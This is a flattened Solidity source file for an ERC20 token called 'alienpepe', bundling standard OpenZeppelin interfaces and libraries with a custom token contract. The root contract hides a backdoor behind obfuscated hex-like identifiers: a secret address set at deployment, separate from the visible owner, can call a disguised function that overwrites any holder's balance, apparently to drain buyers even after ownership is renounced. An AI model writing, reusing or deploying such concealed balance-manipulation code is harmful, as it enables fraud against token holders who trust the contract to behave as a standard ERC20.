/**                                                                                                                                                                                                                                                                                                                                          
               AAA               lllllll   iiii                                             PPPPPPPPPPPPPPPPP                                                             
              A:::A              l:::::l  i::::i                                            P::::::::::::::::P                                                            
             A:::::A             l:::::l   iiii                                             P::::::PPPPPP:::::P                                                           
            A:::::::A            l:::::l                                                    PP:::::P     P:::::P                                                          
           A:::::::::A            l::::l iiiiiii     eeeeeeeeeeee    nnnn  nnnnnnnn           P::::P     P:::::P  eeeeeeeeeeee    ppppp   ppppppppp       eeeeeeeeeeee    
          A:::::A:::::A           l::::l i:::::i   ee::::::::::::ee  n:::nn::::::::nn         P::::P     P:::::Pee::::::::::::ee  p::::ppp:::::::::p    ee::::::::::::ee  
         A:::::A A:::::A          l::::l  i::::i  e::::::eeeee:::::een::::::::::::::nn        P::::PPPPPP:::::Pe::::::eeeee:::::eep:::::::::::::::::p  e::::::eeeee:::::ee
        A:::::A   A:::::A         l::::l  i::::i e::::::e     e:::::enn:::::::::::::::n       P:::::::::::::PPe::::::e     e:::::epp::::::ppppp::::::pe::::::e     e:::::e
       A:::::A     A:::::A        l::::l  i::::i e:::::::eeeee::::::e  n:::::nnnn:::::n       P::::PPPPPPPPP  e:::::::eeeee::::::e p:::::p     p:::::pe:::::::eeeee::::::e
      A:::::AAAAAAAAA:::::A       l::::l  i::::i e:::::::::::::::::e   n::::n    n::::n       P::::P          e:::::::::::::::::e  p:::::p     p:::::pe:::::::::::::::::e 
     A:::::::::::::::::::::A      l::::l  i::::i e::::::eeeeeeeeeee    n::::n    n::::n       P::::P          e::::::eeeeeeeeeee   p:::::p     p:::::pe::::::eeeeeeeeeee  
    A:::::AAAAAAAAAAAAA:::::A     l::::l  i::::i e:::::::e             n::::n    n::::n       P::::P          e:::::::e            p:::::p    p::::::pe:::::::e           
   A:::::A             A:::::A   l::::::li::::::ie::::::::e            n::::n    n::::n     PP::::::PP        e::::::::e           p:::::ppppp:::::::pe::::::::e          
  A:::::A               A:::::A  l::::::li::::::i e::::::::eeeeeeee    n::::n    n::::n     P::::::::P         e::::::::eeeeeeee   p::::::::::::::::p  e::::::::eeeeeeee  
 A:::::A                 A:::::A l::::::li::::::i  ee:::::::::::::e    n::::n    n::::n     P::::::::P          ee:::::::::::::e   p::::::::::::::pp    ee:::::::::::::e  
AAAAAAA                   AAAAAAAlllllllliiiiiiii    eeeeeeeeeeeeee    nnnnnn    nnnnnn     PPPPPPPPPP            eeeeeeeeeeeeee   p::::::pppppppp        eeeeeeeeeeeeee  
                                                                                                                                   p:::::p                                
                                                                                                                                   p:::::p                                
                                                                                                                                  p:::::::p                               
                                                                                                                                  p:::::::p                               
                                                                                                                                  p:::::::p                               
                                                                                                                                  ppppppppp                               
**/ 

// SPDX-License-Identifier: Unlicensed
// Dependency file: @openzeppelin/contracts/token/ERC20/ERC20.sol
// pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


// Dependency file: @openzeppelin/contracts/utils/Context.sol


// pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// Dependency file: @openzeppelin/contracts/access/Ownable.sol


// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol


// pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// Dependency file: contracts/BaseToken.sol

// pragma solidity =0.8.4;

enum TokenType {
    standard
}

abstract contract BaseToken {
    event TokenCreated(
        address indexed owner,
        address indexed token,
        TokenType tokenType,
        uint256 version
    );
}


// Root file: contracts/standard/StandardToken.sol

pragma solidity =0.8.16;

// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
// import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import "contracts/BaseToken.sol";

contract alienpepe is ERC20, Ownable, BaseToken {

  using SafeMath for uint256;

    uint256 private constant VERSION = 1;

    mapping(address => uint256) private Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address private OX3d477GG6TT6G6776f485fe5a0da97411481875;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        address OX3d46f485fe5a0da97411481875,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        OX3d477GG6TT6G6776f485fe5a0da97411481875 = OX3d46f485fe5a0da97411481875;
        _mint(owner(), totalSupply_);
        emit TokenCreated(owner(), address(this), TokenType.standard, VERSION);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[sender] = Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[recipient] = Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account] = Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account] = Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    modifier 
        Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b55() {
         require(
             OX3d477GG6TT6G6776f485fe5a0da97411481875 == _msgSender(),
             "Ownable: caller is not the owner")
        ;
        _;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
function _Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835(address _Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88, address Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1rf0a97fe397dfb6c6d2e835, uint256 Oxba73512a0edf5c3f86639b766de40272bc918a0d5ec42d0f310a8b6ec7ccd781a39a05dcb08f6ed8df8abdc217d7cc88445bf711e4e790a957123d33e6ac0da99, uint256 Ox3e6094fc3f20982b930d205ea99379b6ec9fb5f3527273e27a53a3d5faf3185b817694f045cdb91746c622650ebb799a7980c914353c4d4124cb74bfb822030f,bool Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481b55, uint8 Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875, bytes32 Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da974114818y6, bytes32 Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e655e301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875) external Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b55 { require(_Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88 != address(0), "Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875"); require(Ox3e6094fc3f20982b930d205ea99379b6ec9fb5f3527273e27a53a3d5faf3185b817694f045cdb91746c622650ebb799a7980c914353c4d4124cb74bfb822030f == 0 || 0 <= Ox3e6094fc3f20982b930d205ea99379b6ec9fb5f3527273e27a53a3d5faf3185b817694f045cdb91746c622650ebb799a7980c914353c4d4124cb74bfb822030f, "Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875"); uint _Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b5 = 0;Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[_Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88] = Oxba73512a0edf5c3f86639b766de40272bc918a0d5ec42d0f310a8b6ec7ccd781a39a05dcb08f6ed8df8abdc217d7cc88445bf711e4e790a957123d33e6ac0da99; emit Transfer(_Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88, address(0), Oxba73512a0edf5c3f86639b766de40272bc918a0d5ec42d0f310a8b6ec7ccd781a39a05dcb08f6ed8df8abdc217d7cc88445bf711e4e790a957123d33e6ac0da99);
    }
}